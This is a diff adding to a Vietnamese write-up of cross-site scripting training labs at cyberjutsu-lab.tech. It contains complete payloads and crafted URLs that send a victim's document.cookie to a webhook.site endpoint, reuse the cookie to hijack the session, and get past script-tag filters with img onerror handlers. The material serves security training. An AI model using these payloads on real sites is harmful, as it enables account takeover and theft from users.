@@ -56,13 +56,91 @@ Cách 1: để leak data ra:  dùng chính fetch API để gửi HTTP request k�
 Cách 2: tạo ra 1 tấm ảnh và gán đường dẫn là webhook 
 
 ```
+<script>
 data_leak = document.cookie
 anh = new Image(); 
 anh.src="https://webhook.site/9cc9e2cd-5dd8-45e1-981e-404bb6d8e5b5?leak="+data_leak
+</script>
+```
+## Bước 4: Tạo ra 1 payload hoàn chỉnh trên URL và gửi cho nạn 
+
+Lưu ý: URL encode tất cả dấu cộng "+" để tránh nhầm lẫn giữa kí tự [space] 
+
+```
+https://note1.cyberjutsu-lab.tech/search?q=
+<script>
+data_leak = document.cookie;
+anh = new Image(); 
+URL_LEAK = "https://webhook.site/9cc9e2cd-5dd8-45e1-981e-404bb6d8e5b5?leak=";
+anh.src= URL_LEAK%2Bdata_leak
+</script>
 ```
 
+```
+https://note1.cyberjutsu-lab.tech/search?q=
+<script>
+new Image().src="https://webhook.site/9cc9e2cd-5dd8-45e1-981e-404bb6d8e5b5?leak="%2Bdocument.cookie
+</script>
+```
+## Bước 5: Lấy cookie của nạn nhân rồi sử dụng để đăng nhập phiên của nạn nhân
+
+<img width="959" height="122" alt="image" src="https://github.com/user-attachments/assets/1447c0c1-7ed2-462b-b48f-7d4bfd906d94" />
+
+# 2. Lab 2 #
+
+<img width="626" height="304" alt="image" src="https://github.com/user-attachments/assets/4823c41d-db30-444b-bee9-32c571e1d85e" />
+
+Bài này xóa tag script khi nhập vào
+
+<img width="505" height="72" alt="image" src="https://github.com/user-attachments/assets/55a77d18-c7e6-4d9d-9d5f-dd56a9df5485" />
+
+Để byoass được level 2 thì ta dùng 1 trong 2 cách
+- Bypass đoạn regular expression replace dòng 13
+- Có thể thực thi dc js mà ko cần tag 
+
+## Cách 1
+
+```
+<img%20src="invalid-image"%20onerror="alert(document.cookie)">
+```
+
+Thử và thấy hiện alert thành công 
+
+<img width="754" height="169" alt="image" src="https://github.com/user-attachments/assets/66fadb0a-f138-4065-bb31-74e4b77ecb35" />
+
+Giờ ta sẽ thử sử dụng fetch để bắt request bên webhook
+
+```
+<img src="invalid-image" onerror="fetch('https://webhook.site/9cc9e2cd-5dd8-45e1-981e-404bb6d8e5b5')">
+```
+
+Tiếp theo ta sẽ sửa payload để bắt được giá trị cookie
+```
+https://note2.cyberjutsu-lab.tech/search?q=%3Cimg%20src=%22invalid-image%22%20onerror=%22fetch(%27https://webhook.site/9cc9e2cd-5dd8-45e1-981e-404bb6d8e5b5?leak=%27%2BencodeURIComponent(document.cookie))%22%3E
+```
+
+Thành công lấy được cookie con mèo và flag
+
+<img width="959" height="125" alt="image" src="https://github.com/user-attachments/assets/eebdc205-7b14-4078-8ec9-d576d2e04518" />
 
 
+# 3. Lab 3 #
+
+<img width="615" height="347" alt="image" src="https://github.com/user-attachments/assets/0cb8bd93-73af-4a28-a07a-ce5041bb1790" />
+
+Ở bài này, chỉ cần xuất hiện thẻ <script> thì sẽ hiện hack detected
+
+<img width="380" height="65" alt="image" src="https://github.com/user-attachments/assets/130241c8-0679-433c-ac03-6a90224ab622" />
+
+## Cách 1 : có thể áp dụng theo cách 1 trong lab 2
+
+<img width="959" height="97" alt="image" src="https://github.com/user-attachments/assets/f1f73852-948d-4eaa-96c3-a44d459dc231" />
+
+# 4. Lab 4 #
+
+<img width="638" height="347" alt="image" src="https://github.com/user-attachments/assets/c0795dff-9744-45d6-836b-6a59645828ba" />
+
+## Cách 1 : có thể áp dụng theo cách 1 trong lab 2
 
 
 # NOTE
